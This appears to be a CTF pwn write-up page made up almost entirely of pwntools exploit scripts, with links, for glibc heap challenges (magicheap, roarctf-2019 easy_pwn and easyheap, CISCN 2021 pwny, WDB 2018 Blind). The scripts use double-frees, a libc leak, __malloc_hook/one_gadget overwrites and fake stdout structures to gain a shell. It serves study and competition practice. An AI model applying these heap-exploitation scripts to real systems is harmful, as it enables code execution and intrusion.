<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x18</span> +p64(<span class="number">0x91</span>) + p64(<span class="number">0x10</span>)  +p64(bss-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,p64(<span class="number">9999</span>))</span><br><span class="line">back()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>把bss当fastbin来打，会产生memory corruption</p>
<h2 id="roarctf-2019-easy-pwn">roarctf-2019-easy_pwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,28967)</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./easy&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="number">34</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">15</span> + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recv()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">offset = <span class="number">0x3c4b20</span> </span><br><span class="line"></span><br><span class="line">lib = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x58</span> - offset</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lib)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook+lib)</span><br><span class="line">realloc = libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook + lib - <span class="number">0x22</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">one_gadgets=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">fill(<span class="number">4</span>,<span class="number">27</span>,<span class="string">&quot;a&quot;</span>*<span class="number">11</span> + p64(lib + one_gadgets[<span class="number">2</span>]) + p64(lib + realloc+<span class="number">4</span>))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTExMzA3NTMx">https://blog.csdn.net/mcmuyanga/article/details/111307531<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjExMTIuaHRt">https://bbs.pediy.com/thread-261112.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="roarctf-2019-easyheap">roarctf-2019-easyheap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./ror&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,25136)</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_chunk</span>():</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;please input your username:&quot;</span>,p64(<span class="number">0.1</span>)+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;please input your info:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;build or free?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back2</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span>():</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk()</span><br><span class="line">back(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># b*0x10 --&gt; unsorted_bin, with size of 0xb1</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># split from unsorted_bin, ptr--&gt;this chunk</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># likewise, and after, chunk will be placed in small_bin, buf--&gt;this chunk</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># </span></span><br><span class="line">free()	<span class="comment"># double_free here</span></span><br><span class="line"><span class="comment"># &#x27;e&#x27;-&gt;&#x27;d&#x27;&lt;-&#x27;e&#x27;</span></span><br><span class="line"><span class="comment"># aka. fastbin_0x70: buf-&gt;ptr&lt;-buf</span></span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x0000602060</span></span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk_addr)) <span class="comment"># modify bk,ptr-&gt;0x602060</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x10</span>)	<span class="comment">#clean fastbin</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ror&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0xDEADBEEFDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">read_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> libc</span><br><span class="line">base = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(base)</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">back2(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;3&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free2()</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">free2()</span><br><span class="line"></span><br><span class="line">malloc2(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;4&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;5&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="comment">#[0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc2(<span class="number">0x60</span>, <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one_gadget[<span class="number">3</span>]+base) + p64(realloc + <span class="number">0x14</span>) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzY2ODAyL2FydGljbGUvZGV0YWlscy8xMDg4NzcxOTE=">https://blog.csdn.net/qq_43766802/article/details/108877191<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2021-ciscn-pwny">2021-ciscn-pwny</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwny&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">gadget=[<span class="string">&#x27;0x4f3d5&#x27;</span>,<span class="string">&#x27;0x4f432&#x27;</span>,<span class="string">&#x27;0x10a41c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,p64(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">read(<span class="number">0xfffffffffffffff8</span>)</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">stdout =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">libc_addr = stdout - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pie offset_data=code</span></span><br><span class="line">read(<span class="number">0xfffffffffffffff5</span>)</span><br><span class="line">data =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">pie = data - <span class="number">0x202008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(stdout - 0x202020)</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_addr</span><br><span class="line">mhook = libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = <span class="built_in">int</span>(gadget[<span class="number">1</span>],<span class="number">16</span>) + libc_addr</span><br><span class="line"></span><br><span class="line">offset = (mhook - pie - <span class="number">0x202060</span>)//<span class="number">8</span>   <span class="comment">#id</span></span><br><span class="line"></span><br><span class="line">write(offset,p64(realloc + <span class="number">2</span>))</span><br><span class="line">write(offset-<span class="number">1</span>,p64(one))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)	<span class="comment">#scanf, too large use chunk(malloc hook)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnR0bmJhMy5jbi8yMDIxLzA1LzE1L0NURi0wWDA0LUNJU0NOMjAyMS1QUkVMSU1JTkFSWQ==">https://arttnba3.cn/2021/05/15/CTF-0X04-CISCN2021-PRELIMINARY<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RvcmVidHIvYXJ0aWNsZS9kZXRhaWxzLzExNzEzNzMzNA==">https://blog.csdn.net/Torebtr/article/details/117137334<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjkxMDk0NQ==">https://blog.csdn.net/A951860555/article/details/116910945<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2018-WDB-Blind">2018-WDB-Blind</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26142)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">back = <span class="number">0x4008E3</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x60201d</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;c&quot;*0x43 + p64(0x602020) + p64(0x0602080) +p64(0x0602080+0x68) + p64(0x0602080 + 0x68*2) + p64(0x0602080 + 0x68*3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaa&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x602020</span>) + p64(<span class="number">0x602090</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>) </span><br><span class="line">payload += p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">2</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">fakechunk = p64(<span class="number">0x00000000fbad8080</span>) + p64(<span class="number">0x602060</span>)*<span class="number">7</span> + p64(<span class="number">0x602061</span>) + p64(<span class="number">0</span>)*<span class="number">4</span>  + p64(<span class="number">0x602060</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x602060</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0x602060</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x00000000ffffffff</span>) + p64(<span class="number">0</span>) +  p64(<span class="number">0</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,fakechunk[:<span class="number">0x68</span>])</span><br><span class="line">change(<span class="number">2</span>,fakechunk[<span class="number">0x68</span>:<span class="number">0x68</span>*<span class="number">2</span>])</span><br><span class="line">change(<span class="number">3</span>,fakechunk[<span class="number">0x68</span>*<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">7</span>*<span class="number">8</span> + p64(back) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">change(<span class="number">4</span>, payload)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x602090</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># edit stdout-pointer to io-file-plus</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jYTc0OGI1NjExNWU=">https://www.jianshu.com/p/ca748b56115e<i class="fa fa-external-link-alt"></i></span><br>
